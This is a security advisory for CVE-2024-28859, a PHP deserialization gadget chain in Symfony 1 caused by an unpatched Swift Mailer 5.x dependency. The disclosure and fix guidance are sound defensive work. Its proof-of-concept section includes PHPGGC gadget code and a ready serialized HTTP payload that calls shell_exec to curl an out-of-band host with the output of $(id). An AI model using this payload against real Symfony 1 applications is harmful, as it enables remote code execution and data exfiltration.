# [M] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency

## Summary
Severity: Medium
Advisory: GHSA-wjv8-pxr6-5f4r
CVE: CVE-2024-28859
CWE: CWE-502
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2024-03-18
Source: https://github.com/advisories/GHSA-wjv8-pxr6-5f4r
Type: github-advisory

## Affected
- Packagist: `friendsofsymfony1/symfony1` — affected >=1.3.0 <1.5.18
- Packagist: `friendsofsymfony1/swiftmailer` — affected >=4.0.0 <5.4.13
- Packagist: `friendsofsymfony1/swiftmailer` — affected >=6.0.0 <6.2.5
- Packagist: `swiftmailer/swiftmailer` — affected >=4.0.0 <6.2.5

## Details
### Summary
Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.

### Details
This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:
```php
 public function executeIndex(sfWebRequest $request)
  {
    $a = unserialize($request->getParameter('user'));
  }
```

We will make the assumption this is the case in the rest of this explanation.

Symfony 1 depends on Swift Mailer which is bundled by default in `vendor` directory in the default installation since 1.3.0. Swift Mailer classes implement some `__destruct()` methods like for instance `Swift_KeyCache_DiskKeyCache` :
```php
  public function __destruct()
  {
    foreach ($this->_keys as $nsKey=>$null)
    {
      $this->clearAll($nsKey);
    }
  }
```

This method is called when php destroy the object in memory. However, it is possible to include any object type in `$this->_keys` to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on `foreach($this->_keys ...)` for any class implementing `ArrayAccess`  interface. `sfOutputEscaperArrayDecorator`  implements such interface. Here is the call made on `offsetGet()`:
```php
  public function offsetGet($offset)
  {
    return sfOutputEscaper::escape($this->escapingMethod, $this->value[$offset]);
  }
```
Which trigger `escape()` in `sfOutputEscaper` class with attacker controlled parameters from deserialized object with `$this->escapingMethod` and `$this->value[$offset]`:
```php
  public static function escape($escapingMethod, $value)
  {
    if (null === $value)
    {
      return $value;
    }

    // Scalars are anything other than arrays, objects and resources.
    if (is_scalar($value))
    {
      return call_user_func($escapingMethod, $value);
    }
```
Which calls `call_user_func` with previous attacker controlled input.

However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with [commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed](https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed) to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.

Concreetly, `__wakeup()` have been implemented to clear attributes' values:
```php
  public function __wakeup()
  {
      $this->keys = [];
  }
```

And/or prevent any deserialization:
```php
  public function __wakeup()
  {
      throw new \BadMethodCallException('Cannot unserialize '.__CLASS__);
  }
```

If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:
```json
{
  "name": "friendsofsymfony1/symfony1",
  "version": "v1.5.15",
  "source": {
      "type": "git",
      "url": "https://github.com/FriendsOfSymfony1/symfony1.git",
      "reference": "9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2"
  },
  "require": {
      "php": ">=5.3.0",
      "swiftmailer/swiftmailer": "~5.2 || ^6.0"
  },
  ...
  {
    "name": "swiftmailer/swiftmailer",
    "version": "v6.3.0",
  ...
  }
}
```

By reviewing releases archives, `composer.json` targets vulnerable branch 5.x before Symfony 1.5.13 included:
```json
{
    "name": "friendsofsymfony1/symfony1",
    "description": "Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance",
    "type": "library",
    "license": "MIT",
    "require": {
        "php" : ">=5.3.0",
        "swiftmailer/swiftmailer": "~5.2"
    },
    ...
```

So, the gadget chain is valid for at least versions until 1.5.13.

However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:
```shell
[submodule "lib/vendor/swiftmailer"]
    path = lib/vendor/swiftmailer
    url = https://github.com/swiftmailer/swiftmailer.git
    branch = 5.x
[submodule "lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine"]
    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine
    url = https://github.com/FriendsOfSymfony1/doctrine1.git
```

And branch 5.x does not have the backport of the fix committed on branch 6.x. Last commit date from Jul 31, 2018.

### PoC

So we need the following object to trigger an OS command like `shell_exec("curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)");`:

```php
object(Swift_KeyCache_DiskKeyCache)#88 (4) {
  ["_stream":"Swift_KeyCache_DiskKeyCache":private]=>
  NULL
  ["_path":"Swift_KeyCache_DiskKeyCache":private]=>
  string(25) "thispathshouldneverexists"
  ["_keys":"Swift_KeyCache_DiskKeyCache":private]=>
  object(sfOutputEscaperArrayDecorator)#89 (3) {
    ["count":"sfOutputEscaperArrayDecorator":private]=>
    NULL
    ["value":protected]=>
    array(1) {
      [1]=>
      string(66) "curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)"
    }
    ["escapingMethod":protected]=>
    string(10) "shell_exec"
  }
  ["_quotes":"Swift_KeyCache_DiskKeyCache":private]=>
  bool(false)
}
```

We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:
* gadgets.php:
```php
class Swift_KeyCache_DiskKeyCache
{
  private $_path;
  private $_keys = array();
  public function __construct($keys, $path) {
    $this->_keys = $keys;
    $this->_path = $path;
  }
}

class sfOutputEscaperArrayDecorator
{
  protected $value;
  protected $escapingMethod;
  public function __construct($escapingMethod, $value) {
    $this->escapingMethod = $escapingMethod;
    $this->value = $value;
  }
}
```

* chain.php:
```php
namespace GadgetChain\Symfony;

class RCE12 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.3.0 < 1.5.15';
    public static $vector = '__destruct';
    public static $author = 'darkpills';
    public static $information = 
        'Based on Symfony 1 and Swift mailer in Symfony\'s vendor';

    public function generate(array $parameters)
    {
        $cacheKey = "1";
        $keys = new \sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey => $parameters['parameter']));
        $path = "thispathshouldneverexists";
        $cache = new \Swift_KeyCache_DiskKeyCache($keys, $path);

        return $cache;
    }
}
```

And trigger the deserialization with an HTTP request like the following on a dummy test controller:

```http
POST /frontend_dev.php/test/index HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

user=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D
```

Note that CVSS score is not applicable to this kind of vulnerability.

### Impact
The attacker can execute any PHP command which leads to remote code execution.

### Recommendation
As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?

In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed

Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed

## References
- https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r
- https://nvd.nist.gov/vuln/detail/CVE-2024-28859
- https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166
- https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml
- https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml
- https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml
- https://github.com/FriendsOfSymfony1/symfony1
